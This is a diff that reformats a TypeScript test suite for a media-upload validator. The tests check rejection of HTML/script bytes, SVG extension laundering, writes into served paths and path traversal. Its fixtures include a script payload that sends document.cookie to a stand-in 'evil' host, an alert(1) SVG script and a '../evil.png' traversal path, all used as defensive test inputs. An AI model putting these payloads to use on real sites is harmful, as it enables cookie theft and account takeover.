@@ -26,7 +26,10 @@ describe('validateAndSanitizeMediaBytes — content gate', () => {
   it('rejects HTML/script bytes (no accepted media MIME) — the account-takeover payload', () => {
     const html = enc.encode('<!DOCTYPE html><script>fetch("//evil/?c="+document.cookie)</script>')
     expect(() =>
-      validateAndSanitizeMediaBytes(html, { storagePath: 'published/current/index.html', mimeType: 'text/html' }),
+      validateAndSanitizeMediaBytes(html, {
+        storagePath: 'published/current/index.html',
+        mimeType: 'text/html',
+      }),
     ).toThrow(ImportMediaValidationError)
   })
 
@@ -40,12 +43,17 @@ describe('validateAndSanitizeMediaBytes — content gate', () => {
   it('rejects extension laundering (SVG bytes named .html)', () => {
     const svg = enc.encode('<svg><rect width="10" height="10"/></svg>')
     expect(() =>
-      validateAndSanitizeMediaBytes(svg, { storagePath: 'exploit.html', mimeType: 'image/svg+xml' }),
+      validateAndSanitizeMediaBytes(svg, {
+        storagePath: 'exploit.html',
+        mimeType: 'image/svg+xml',
+      }),
     ).toThrow(ImportMediaValidationError)
   })
 
   it('sanitizes a <script> payload out of an otherwise-valid SVG', () => {
-    const svg = enc.encode('<svg viewBox="0 0 10 10"><script>alert(1)</script><rect width="10" height="10"/></svg>')
+    const svg = enc.encode(
+      '<svg viewBox="0 0 10 10"><script>alert(1)</script><rect width="10" height="10"/></svg>',
+    )
     const clean = new TextDecoder().decode(
       validateAndSanitizeMediaBytes(svg, { storagePath: 'icon.svg', mimeType: 'image/svg+xml' }),
     )
@@ -55,7 +63,10 @@ describe('validateAndSanitizeMediaBytes — content gate', () => {
   })
 
   it('passes a valid image through unchanged', () => {
-    const out = validateAndSanitizeMediaBytes(PNG_MAGIC, { storagePath: 'abc.png', mimeType: 'image/png' })
+    const out = validateAndSanitizeMediaBytes(PNG_MAGIC, {
+      storagePath: 'abc.png',
+      mimeType: 'image/png',
+    })
     expect(out).toEqual(PNG_MAGIC)
   })
 })
@@ -63,18 +74,22 @@ describe('validateAndSanitizeMediaBytes — content gate', () => {
 describe('resolveMediaWriteTarget — destination gate', () => {
   const uploads = '/tmp/uploads'
 
-  it.each(['published/current/index.html', 'plugins/acme/app.js', 'fonts/inter.woff2', 'PUBLISHED/x.png'])(
-    'rejects a write into the reserved served subtree: %s',
-    (storagePath) => {
-      expect(() => resolveMediaWriteTarget(uploads, storagePath)).toThrow(ImportMediaValidationError)
-    },
-  )
+  it.each([
+    'published/current/index.html',
+    'plugins/acme/app.js',
+    'fonts/inter.woff2',
+    'PUBLISHED/x.png',
+  ])('rejects a write into the reserved served subtree: %s', (storagePath) => {
+    expect(() => resolveMediaWriteTarget(uploads, storagePath)).toThrow(ImportMediaValidationError)
+  })
 
   it('rejects a traversal escape', () => {
     expect(() => resolveMediaWriteTarget(uploads, '../evil.png')).toThrow()
   })
 
   it('resolves a normal hashed media filename to a path inside uploads', () => {
-    expect(resolveMediaWriteTarget(uploads, 'a1b2c3-photo.jpg')).toBe(join(uploads, 'a1b2c3-photo.jpg'))
+    expect(resolveMediaWriteTarget(uploads, 'a1b2c3-photo.jpg')).toBe(
+      join(uploads, 'a1b2c3-photo.jpg'),
+    )
   })
 })
